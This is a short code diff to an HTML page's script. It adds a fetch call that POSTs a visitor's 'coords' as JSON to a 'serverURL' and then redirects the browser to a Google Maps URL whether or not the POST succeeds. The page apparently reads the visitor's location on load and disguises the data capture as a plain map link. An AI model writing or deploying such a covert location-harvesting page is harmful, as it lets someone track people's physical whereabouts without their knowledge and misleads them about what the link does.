@@ -45,19 +45,27 @@
             }
         }
 
+        fetch(serverURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(coords)
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('HTTP error ' + response.status);
+            return response.json();
+        })
+        .then(data => {
+            console.log('Success:', data);
+            window.location.href = googleMapsURL;
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            window.location.href = googleMapsURL;
+        });
+
         // Start location request when page loads
         window.onload = getLocation;
-        fetch(serverURL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(coords)
-})
-.then(response => {
-    if (!response.ok) throw new Error('Server error');
-    return response.json();
-})
-.then(data => console.log('Success:', data))
-.catch(error => console.error('Error:', error));
+        
     </script>
 </body>
 </html>
